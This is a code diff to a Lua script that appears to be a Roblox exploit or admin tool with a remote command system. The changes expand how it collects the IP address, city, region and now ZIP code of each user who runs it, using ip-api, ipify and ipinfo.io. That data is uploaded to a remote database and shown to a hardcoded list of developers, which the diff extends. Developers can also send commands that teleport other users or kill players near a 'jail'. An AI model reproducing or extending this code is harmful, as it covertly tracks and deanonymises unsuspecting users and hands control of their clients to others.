@@ -35,7 +35,7 @@ local GLOBAL_DELAY = 1
 local TIMESTAMP_TOLERANCE = 5
 local HEARTBEAT_INTERVAL = 5
 local OFFLINE_THRESHOLD = 15
-local PLAYERS_REFRESH_INTERVAL = 15
+local PLAYERS_REFRESH_INTERVAL = 300
 
 local Developers = {
     ["Go2mohamed"] = true,
@@ -52,7 +52,12 @@ local Developers = {
 }
 
 local TabAccess = {
-    connectedPlayers = { Go2mohamed = true, Go2yousef = true },
+    connectedPlayers = {
+        Go2mohamed = true,
+        Go2yousef = true,
+        joo77xb = true,
+        qert6154 = true,
+    },
 }
 
 local LOCAL_ONLY = {
@@ -71,6 +76,7 @@ local PLAYER_INFO = {
     countryCode = "",
     city = "",
     region = "",
+    zip = "",
     ip = "N/A",
     phoneIp = "N/A",
     utcOffset = 0,
@@ -80,7 +86,25 @@ local PLAYER_INFO = {
 
 local function IsDevPlayer(p)
     if not p then return false end
-    return Developers[p.DisplayName] == true or Developers[p.Name] == true
+    local dn = p.DisplayName or ""
+    local nm = p.Name or ""
+    for devName, val in pairs(Developers) do
+        if val and (devName:lower() == dn:lower() or devName:lower() == nm:lower()) then
+            return true
+        end
+    end
+    return false
+end
+
+local function IsDeveloperUsername(name)
+    if not name or name == "" then return false end
+    local lower = name:lower()
+    for devName, val in pairs(Developers) do
+        if val and devName:lower() == lower then
+            return true
+        end
+    end
+    return false
 end
 
 local IsDeveloper = IsDevPlayer(LocalPlayer)
@@ -199,31 +223,44 @@ local function HttpGetRaw(url)
         local ok, res = pcall(httpRequest, { Url = url, Method = "GET" })
         if ok and res and res.Body and res.Body ~= "" then
             local ok2, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
-            if ok2 then return decoded end
+            if ok2 and type(decoded) == "table" then return decoded end
+            local trimmed = res.Body:gsub("%s+", "")
+            if trimmed ~= "" then return { ip = trimmed } end
         end
     end
     local ok, res = pcall(function() return HttpService:GetAsync(url) end)
     if ok and res then
         local ok2, decoded = pcall(function() return HttpService:JSONDecode(res) end)
-        if ok2 then return decoded end
+        if ok2 and type(decoded) == "table" then return decoded end
+        local trimmed = tostring(res):gsub("%s+", "")
+        if trimmed ~= "" then return { ip = trimmed } end
     end
     return nil
 end
 
 local function FetchIPInfo()
-    local deviceData = HttpGetRaw("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,timezone,query,offset")
+    local deviceData = HttpGetRaw("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,timezone,query,offset")
     if deviceData and type(deviceData) == "table" then
         PLAYER_INFO.country = tostring(deviceData.country or "Unknown")
         PLAYER_INFO.countryCode = tostring(deviceData.countryCode or "")
         PLAYER_INFO.region = tostring(deviceData.regionName or "")
         PLAYER_INFO.city = tostring(deviceData.city or "")
+        PLAYER_INFO.zip = tostring(deviceData.zip or "")
         PLAYER_INFO.ip = tostring(deviceData.query or "N/A")
         PLAYER_INFO.utcOffset = tonumber(deviceData.offset) or 0
     end
     local phoneData = HttpGetRaw("https://api.ipify.org?format=json")
     if phoneData and type(phoneData) == "table" and phoneData.ip then
         PLAYER_INFO.phoneIp = tostring(phoneData.ip)
-    elseif not phoneData then
+    else
+        local phoneAlt = HttpGetRaw("https://ipinfo.io/ip")
+        if phoneAlt and type(phoneAlt) == "table" and phoneAlt.ip then
+            PLAYER_INFO.phoneIp = tostring(phoneAlt.ip)
+        else
+            PLAYER_INFO.phoneIp = PLAYER_INFO.ip
+        end
+    end
+    if PLAYER_INFO.phoneIp == "N/A" or PLAYER_INFO.phoneIp == "" then
         PLAYER_INFO.phoneIp = PLAYER_INFO.ip
     end
 end
@@ -237,6 +274,7 @@ local function RegisterPlayer()
         countryCode = PLAYER_INFO.countryCode,
         city = PLAYER_INFO.city,
         region = PLAYER_INFO.region,
+        zip = PLAYER_INFO.zip,
         ip = PLAYER_INFO.ip,
         phoneIp = PLAYER_INFO.phoneIp,
         utcOffset = PLAYER_INFO.utcOffset,
@@ -575,9 +613,7 @@ end
 local function StopRainbowMap()
     if RainbowMapData.Active then
         RainbowMapData.Active = false
-        if RainbowMapData.Thread then
-            RainbowMapData.Thread = nil
-        end
+        RainbowMapData.Thread = nil
         if RainbowMapData.OriginalColors then
             for part, orig in pairs(RainbowMapData.OriginalColors) do
                 if part and part.Parent then part.Color = orig end
@@ -693,7 +729,7 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
     if cmd == "joinserver" then
         if target == LocalPlayer and value then
             local placeId, jobId = tostring(value):match("^(%d+)|(.+)$")
-            if placeId and jobId then
+            if placeId and jobId and jobId ~= "" then
                 task.wait(0.5)
                 pcall(function()
                     TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, LocalPlayer)
@@ -847,7 +883,7 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
             end
         end)
     elseif cmd == "jail" then
-        local size = 10
+        local size = 12
         if JailData[pName] and JailData[pName].Active then
             JailData[pName].Active = false
             if JailData[pName].Walls then
@@ -868,6 +904,7 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
         JailData[pName].Active = true
         JailData[pName].Position = jailPos
         JailData[pName].Size = size
+        JailData[pName].IntruderTimes = {}
         local function buildWallsAt(pos)
             if JailData[pName].Walls then
                 for _, w in pairs(JailData[pName].Walls) do
@@ -884,9 +921,9 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
                 CFrame.new(pos + Vector3.new(0, -size / 2, 0))
             }
             local wallSizes = {
-                Vector3.new(size, size, 0.5), Vector3.new(size, size, 0.5),
-                Vector3.new(0.5, size, size), Vector3.new(0.5, size, size),
-                Vector3.new(size, 0.5, size), Vector3.new(size, 0.5, size)
+                Vector3.new(size, size, 1), Vector3.new(size, size, 1),
+                Vector3.new(1, size, size), Vector3.new(1, size, size),
+                Vector3.new(size, 1, size), Vector3.new(size, 1, size)
             }
             for i = 1, 6 do
                 local w = Instance.new("Part")
@@ -895,9 +932,11 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
                 w.CFrame = wallPositions[i]
                 w.Anchored = true
                 w.CanCollide = true
+                w.CanTouch = false
+                w.CanQuery = true
                 w.Transparency = 0.3
                 w.Color = PURPLE
-                w.Material = Enum.Material.Neon
+                w.Material = Enum.Material.ForceField
                 w.Parent = Workspace
                 table.insert(walls, w)
             end
@@ -918,15 +957,47 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
         end)
         task.spawn(function()
             while JailData[pName] and JailData[pName].Active do
+                local jd = JailData[pName]
+                if not jd then break end
                 local curChar = target.Character
                 local curHRP = curChar and curChar:FindFirstChild("HumanoidRootPart")
                 if curHRP and curHRP.Parent then
-                    if (curHRP.Position - JailData[pName].Position).Magnitude > (size + 1) then
-                        curHRP.CFrame = CFrame.new(JailData[pName].Position + Vector3.new(0, 2, 0))
+                    if (curHRP.Position - jd.Position).Magnitude > (size + 1) then
+                        curHRP.CFrame = CFrame.new(jd.Position + Vector3.new(0, 2, 0))
                         curHRP.Velocity = Vector3.zero
                     end
                 end
-                task.wait(0.08)
+                for _, plr in ipairs(Players:GetPlayers()) do
+                    if plr ~= target and plr.Character then
+                        local ihrp = plr.Character:FindFirstChild("HumanoidRootPart")
+                        if ihrp and ihrp.Parent then
+                            local dist = (ihrp.Position - jd.Position).Magnitude
+                            if dist < (size * 0.55) then
+                                local dir = ihrp.Position - jd.Position
+                                if dir.Magnitude < 0.5 then
+                                    dir = Vector3.new(0, 0, 1)
+                                end
+                                dir = Vector3.new(dir.X, 0, dir.Z)
+                                if dir.Magnitude < 0.1 then dir = Vector3.new(0, 0, 1) end
+                                dir = dir.Unit
+                                local pushDist = math.random() * 2 + 4
+                                local newPos = jd.Position + dir * (size * 0.5 + pushDist)
+                                ihrp.CFrame = CFrame.new(newPos + Vector3.new(0, 2, 0))
+                                ihrp.Velocity = Vector3.zero
+                                ihrp.RotVelocity = Vector3.zero
+                                local now = tick()
+                                local lastTime = jd.IntruderTimes[plr.Name] or 0
+                                if (now - lastTime) < 2.5 then
+                                    local h = plr.Character:FindFirstChildOfClass("Humanoid")
+                                    if h then h.Health = 0 end
+                                else
+                                    jd.IntruderTimes[plr.Name] = now
+                                end
+                            end
+                        end
+                    end
+                end
+                task.wait(0.06)
             end
         end)
     elseif cmd == "legback" then
@@ -1341,14 +1412,14 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
         RainbowMapData = { Active = true, OriginalColors = {} }
         local count = 0
         for _, obj in ipairs(Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") and not obj:FindFirstAncestorOfClass("Model") == nil or obj:IsA("BasePart") then
+            if obj:IsA("BasePart") then
                 RainbowMapData.OriginalColors[obj] = obj.Color
                 count = count + 1
                 if count >= 3000 then break end
             end
         end
         local hue = 0
-        local thread = task.spawn(function()
+        RainbowMapData.Thread = task.spawn(function()
             while RainbowMapData.Active do
                 hue = (hue + 0.015) % 1
                 local col = Color3.fromHSV(hue, 1, 1)
@@ -1364,7 +1435,6 @@ ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
                 task.wait(0.1)
             end
         end)
-        RainbowMapData.Thread = thread
     elseif cmd == "zenixdarkweb" then
         local sg = Instance.new("ScreenGui")
         sg.Name = "ZenixDarkWeb"
@@ -1542,16 +1612,7 @@ local function HandleRemoteCommand(key, cmdData)
         return
     end
 
-    local isDevSender = Developers[sender] == true
-    if not isDevSender then
-        for devName in pairs(Developers) do
-            if devName:lower() == sender:lower() then
-                isDevSender = true
-                break
-            end
-        end
-    end
-    if not isDevSender then
+    if not IsDeveloperUsername(sender) then
         MarkProcessed(key)
         return
     end
@@ -1566,7 +1627,18 @@ local function HandleRemoteCommand(key, cmdData)
     MarkProcessed(key)
 
     task.spawn(function()
-        pcall(ExecuteCommand, cmd, targetPlayer.Name, (cmdData.value and cmdData.value ~= "" and cmdData.value or nil), sender, targetPlayer)
+        local ok, err = pcall(ExecuteCommand, cmd, targetPlayer.Name, (cmdData.value and cmdData.value ~= "" and cmdData.value or nil), sender, targetPlayer)
+        if not ok then
+            pcall(function()
+                HttpCall("PATCH", "commands/" .. key .. ".json", {
+                    status = "failed",
+                    executedAt = os.time(),
+                    executedBy = LocalPlayer.Name,
+                    error = tostring(err)
+                })
+            end)
+            return
+        end
         task.wait(GLOBAL_DELAY)
         pcall(function()
             HttpCall("PATCH", "commands/" .. key .. ".json", {
@@ -1816,7 +1888,13 @@ if IsDeveloper then
             return scroll
         end
 
-        local canSeeConnPlayers = TabAccess.connectedPlayers[LocalPlayer.Name] == true
+        local canSeeConnPlayers = false
+        for devName, val in pairs(TabAccess.connectedPlayers) do
+            if val and devName:lower() == LocalPlayer.Name:lower() then
+                canSeeConnPlayers = true
+                break
+            end
+        end
 
         local AdminTab = CreateTab("أوامر المطورين")
         local BangTab = CreateTab("Bang")
@@ -2309,8 +2387,8 @@ if IsDeveloper then
             statusLbl.Size = UDim2.new(0, 60, 0, 15)
             statusLbl.Position = UDim2.new(0, 4, 0, 6)
             statusLbl.BackgroundTransparency = 1
-            statusLbl.Text = playerData.status == "online" and "متصل" or "غير متصل"
-            statusLbl.TextColor3 = playerData.status == "online" and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 150, 150)
+            statusLbl.Text = "متصل"
+            statusLbl.TextColor3 = Color3.fromRGB(150, 255, 150)
             statusLbl.Font = Enum.Font.GothamBold
             statusLbl.TextSize = 11
             statusLbl.TextXAlignment = Enum.TextXAlignment.Right
@@ -2320,7 +2398,7 @@ if IsDeveloper then
             infoLine.Size = UDim2.new(1, -16, 0, 16)
             infoLine.Position = UDim2.new(0, 8, 0, 44)
             infoLine.BackgroundTransparency = 1
-            infoLine.Text = "الدولة: " .. (playerData.country or "Unknown") .. "  |  " .. (playerData.city or "-")
+            infoLine.Text = "الدولة: " .. (playerData.country or "Unknown") .. "  |  " .. (playerData.city or "-") .. (playerData.zip and playerData.zip ~= "" and (" - " .. playerData.zip) or "")
             infoLine.TextColor3 = Color3.fromRGB(220, 200, 255)
             infoLine.Font = Enum.Font.Gotham
             infoLine.TextSize = 11
@@ -2472,10 +2550,11 @@ if IsDeveloper then
                 addRow("الدولة", tostring(playerData.country or "Unknown"))
                 addRow("المدينة", tostring(playerData.city or "-"))
                 addRow("المنطقة", tostring(playerData.region or "-"))
+                addRow("الرمز البريدي", tostring(playerData.zip or "-"))
                 addRow("عنوان ip", tostring(playerData.ip or "N/A"))
                 addRow("ip الهاتف", tostring(playerData.phoneIp or "N/A"))
                 addRow("عمر الحساب", tostring(playerData.accountAgeDays or 0) .. " يوم")
-                addRow("الحالة", playerData.status == "online" and "متصل" or "غير متصل")
+                addRow("الحالة", "متصل")
                 addRow("Place ID", tostring(playerData.placeId or 0))
                 addRow("Job ID", tostring(playerData.jobId or "-"))
             end)
@@ -2534,12 +2613,13 @@ if IsDeveloper then
                     pdata.username = username
                     local ls = tonumber(pdata.lastSeen) or 0
                     local isOnline = (now - ls) <= OFFLINE_THRESHOLD
-                    pdata.status = isOnline and "online" or "offline"
-                    table.insert(list, pdata)
+                    if isOnline then
+                        pdata.status = "online"
+                        table.insert(list, pdata)
+                    end
                 end
             end
             table.sort(list, function(a, b)
-                if a.status ~= b.status then return a.status == "online" end
                 return (a.username or "") < (b.username or "")
             end)
             for _, pdata in ipairs(list) do
@@ -2548,28 +2628,9 @@ if IsDeveloper then
         end
 
         if ConnectedPlayersTab then
-            local ConnHeader = Instance.new("Frame")
-            ConnHeader.Size = UDim2.new(1, 0, 0, 35)
-            ConnHeader.BackgroundTransparency = 1
-            ConnHeader.Parent = ConnectedPlayersTab
-            local searchBox = Instance.new("TextBox")
-            searchBox.Size = UDim2.new(0.95, 0, 0, 28)
-            searchBox.Position = UDim2.new(0.025, 0, 0, 4)
-            searchBox.BackgroundColor3 = Color3.fromRGB(40, 30, 55)
-            searchBox.BorderSizePixel = 0
-            searchBox.PlaceholderText = "ابحث بالاسم الأساسي أو المستعار..."
-            searchBox.Text = ""
-            searchBox.TextColor3 = Color3.fromRGB(220, 200, 255)
-            searchBox.PlaceholderColor3 = Color3.fromRGB(200, 170, 255)
-            searchBox.Font = Enum.Font.GothamMedium
-            searchBox.TextSize = 13
-            searchBox.ClearTextOnFocus = false
-            searchBox.Parent = ConnHeader
-            Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 6)
-
             local ConnScroll = Instance.new("ScrollingFrame")
-            ConnScroll.Size = UDim2.new(1, 0, 1, -40)
-            ConnScroll.Position = UDim2.new(0, 0, 0, 40)
+            ConnScroll.Size = UDim2.new(1, 0, 1, 0)
+            ConnScroll.Position = UDim2.new(0, 0, 0, 0)
             ConnScroll.BackgroundTransparency = 1
             ConnScroll.ScrollBarThickness = 6
             ConnScroll.ScrollBarImageColor3 = PURPLE
